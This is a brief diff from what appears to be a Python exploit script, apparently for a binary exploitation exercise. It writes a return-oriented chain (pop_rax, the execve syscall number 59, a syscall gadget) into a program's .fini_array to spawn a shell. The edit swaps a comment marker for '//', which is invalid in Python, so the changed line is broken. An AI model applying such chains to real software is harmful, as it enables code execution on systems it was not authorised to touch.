@@ -120,7 +120,7 @@ write_val(fini_array + 56, p64(0))
 
 write_val(fini_array + 64, p64(pop_rax))
 
-write_val(fini_array + 72, p64(59))  #// execve syscall (0x3b)
+write_val(fini_array + 72, p64(59))  // execve syscall (0x3b)
 
 write_val(fini_array + 80, p64(syscall))     
 
